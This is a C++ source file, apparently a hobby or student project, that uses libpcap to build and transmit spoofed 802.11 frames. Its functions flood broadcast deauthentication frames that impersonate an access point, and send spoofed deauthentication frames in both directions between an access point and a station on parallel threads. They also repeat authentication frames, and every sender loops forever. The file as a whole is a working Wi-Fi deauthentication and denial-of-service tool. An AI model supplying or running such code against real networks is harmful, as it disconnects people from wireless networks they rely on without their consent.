#include <pcap.h>
#include <thread>
#include "attack_frame.h"
#include "utils.h"
#include <unistd.h>
#include <cstring>

void send_deauth_packet(Deauthentication_Frame deauth_frame, pcap_t *handle)
{
    printf("%d\n", sizeof(Deauthentication_Frame));
    printf("%x\n", deauth_frame.radiotap_header.antenna_signal2);
    while(1)
    {
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&deauth_frame), sizeof(Deauthentication_Frame));

        sleep(2); 

    }
    pcap_close(handle);
}

void send_auth_packet(Authentication_Frame auth_frame, pcap_t *handle)
{
    printf("%d\n", sizeof(Authentication_Frame));
    printf("%x\n", auth_frame.radiotap_header.antenna_signal2);
    while(1)
    {
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&auth_frame), sizeof(Authentication_Frame));

        sleep(5); 

    }
    pcap_close(handle);
}


void send_deauth_broadcast(Deauthentication_Frame deauth_frame, pcap_t *handle, char *argv[])
{
    //destination mac 바꾸기
    printf("send: %d\n", deauth_frame.radiotap_header.header_length);
    uint8_t broadcast_mac_address[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    memcpy(deauth_frame.deauthentication_main_frame.destination_address, broadcast_mac_address, 6);

    // source 맥 바꾸기
    char source_mac_bytes[6] = {0};
    convert_mac_address(argv[2], source_mac_bytes);
    // uint8_t source_mac_bytes[6] = {0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff};

    memcpy(deauth_frame.deauthentication_main_frame.source_address, source_mac_bytes, 6);

    // BSSID 바꾸기
    memcpy(deauth_frame.deauthentication_main_frame.bss_id, source_mac_bytes, 6);

    send_deauth_packet(deauth_frame, handle);
    
}

void send_deauth_to_bidirection(Deauthentication_Frame deauth_frame, pcap_t *handle, char *argv[])
{
    // AP(source) -> Station(destination) 설정
    char source_mac[6] = {0};
    char destination_mac[6] = {0};
    convert_mac_address(argv[2], source_mac);
    convert_mac_address(argv[3], destination_mac);

    memcpy(deauth_frame.deauthentication_main_frame.source_address, source_mac, 6);
    memcpy(deauth_frame.deauthentication_main_frame.destination_address, destination_mac, 6);
    memcpy(deauth_frame.deauthentication_main_frame.bss_id, source_mac, 6);

    // Station(source) -> AP(destination) 설정
    Deauthentication_Frame deauth_frame_reverse = deauth_frame;  // 복사본 생성
    char source_mac2[6] = {0};
    char destination_mac2[6] = {0};
    convert_mac_address(argv[3], source_mac2);  // 주소 반전
    convert_mac_address(argv[2], destination_mac2);
    memcpy(deauth_frame_reverse.deauthentication_main_frame.source_address, source_mac2, 6);
    memcpy(deauth_frame_reverse.deauthentication_main_frame.destination_address, destination_mac2, 6);
    memcpy(deauth_frame_reverse.deauthentication_main_frame.bss_id, destination_mac2, 6);

    std::thread thread_ap_to_station(send_deauth_packet, deauth_frame, handle);
    std::thread thread_station_to_ap(send_deauth_packet, deauth_frame_reverse, handle);

    thread_ap_to_station.join();
    thread_station_to_ap.join();
}


void send_auth(Authentication_Frame auth_frame, pcap_t *handle, char *argv[])
{
     // Station(source) -> AP(destination) 설정
    char source_mac[6] = {0};
    char destination_mac[6] = {0};
    convert_mac_address(argv[3], source_mac);  // 주소 반전
    convert_mac_address(argv[2], destination_mac);
    memcpy(auth_frame.authentication_main_frame.source_address, source_mac, 6);
    memcpy(auth_frame.authentication_main_frame.destination_address, destination_mac, 6);
    memcpy(auth_frame.authentication_main_frame.bss_id, destination_mac, 6);

    send_auth_packet(auth_frame, handle);


}
